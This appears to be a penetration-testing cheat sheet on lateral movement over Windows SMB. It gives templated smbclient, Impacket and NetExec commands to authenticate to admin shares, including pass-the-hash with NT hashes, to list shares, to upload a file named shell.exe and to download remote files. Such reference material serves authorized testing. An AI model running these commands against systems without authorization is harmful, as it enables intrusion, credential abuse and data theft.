# Unix Shell

Search Tag(s): #lateral-movement #impacket #windows

## 01 - Authenticate

### 1.1 - Samba Suite Utils

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/c$
```

Pass the Hash

```
$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/c$
```

### 1.2 - Impacket

```
$ smbclient.py [<domain>/]<username>:<password>@<IP>
```

Pass the Hash

```
$ smbclient.py -hashes :<nt_hash> [<domain>/]<username>@<IP>
```

### 1.3 - NetExec

#### 1.3.1 - Authentication

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth]
```

Pass the Hash

```
$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```

## 02 - List Files and Directories

### 2.1 - Samba Suite Utils

```
smb: \> ls
```

### 2.2 - Impacket

```
# use c$

# ls
```

### 2.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --shares
```

## 03 - Copy Files

### 3.1 - Samba Suite Utils

Upload file

```
smb: \> put /path/to/local/shell.exe
```

Download file

```
smb: \> get \path\to\remote\file.txt
```

### 3.2 - Impacket

Upload file

```
# put /path/to/local/shell.exe
```

Download file

```
# get \path\to\remote\file.txt
```

### 3.3 - NetExec

Upload file

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --put-file /path/to/local/shell.exe \\path\\to\\remote\\shell.exe

$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --put-file /path/to/local/shell.exe \\path\\to\\remote\\shell.exe
```

Download file

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file \\path\\to\\remote\\file.txt /path/to/local/file.txt

$ netexec smb <IP> -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --get-file \\path\\to\\remote\\file.txt /path/to/local/file.txt
```

---
## References

- [NetExec Wiki: Get and Put Files](https://www.netexec.wiki/smb-protocol/get-and-put-files)